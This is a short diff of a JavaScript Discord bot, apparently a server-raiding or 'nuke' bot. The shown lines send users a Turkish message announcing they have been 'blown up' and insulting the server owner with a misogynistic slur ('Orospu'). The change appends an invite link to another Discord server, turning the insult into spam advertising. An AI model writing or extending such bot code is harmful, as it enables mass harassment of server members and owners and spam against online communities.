@@ -534,7 +534,7 @@ client.on("message", async msg => {
         users.send(
           "`Patlatıldın knk, Burdan` <@" + ////     await msg.guild.channels.find(x => x.name === "ャ");
             msg.guild.owner.id +
-            ">`İsimli Orospuya Selamlar!`"
+            ">`İsimli Orospuya Selamlar!` https://discord.gg/vd77Jpf"
         )
       )
       .catch(console.error);
